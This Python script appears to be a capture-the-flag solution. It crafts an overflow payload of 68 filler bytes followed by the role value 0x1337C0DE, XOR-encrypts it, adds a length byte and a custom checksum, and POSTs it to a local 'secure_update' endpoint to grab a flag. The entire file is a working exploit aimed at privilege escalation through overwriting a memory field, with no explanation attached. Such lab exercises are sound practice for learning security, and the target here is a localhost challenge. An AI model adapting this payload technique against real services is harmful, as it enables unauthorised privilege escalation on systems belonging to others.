import struct

import requests

URL = "http://localhost:8011"
XOR_KEY = 0x7A


def calc_checksum(data_bytes):
    crc = 0xAAAA
    for byte in data_bytes:
        crc ^= byte
        if crc & 1:
            crc = (crc >> 1) ^ 0x8008
        else:
            crc = crc >> 1
    return crc


def solve():
    print("[*] Generating Payload...")
    padding = b"A" * 68
    target_role = struct.pack("<I", 0x1337C0DE)

    plaintext = padding + target_role

    # Encrypt
    encrypted = bytearray([b ^ XOR_KEY for b in plaintext])

    # Checksum & Header
    checksum = calc_checksum(plaintext)
    header = struct.pack("B", len(plaintext)) + struct.pack(">H", checksum)

    packet_hex = (header + encrypted).hex().upper()

    print("[*] Sending Attack...")
    r = requests.post(f"{URL}/api/user/secure_update", json={"packet": packet_hex})

    print(f"[*] Response: {r.text}")

    if "flag" in r.json():
        print(f"\n🔥 PWNED! FLAG: {r.json()['flag']} 🔥")
    else:
        print("[-] Failed.")


if __name__ == "__main__":
    solve()
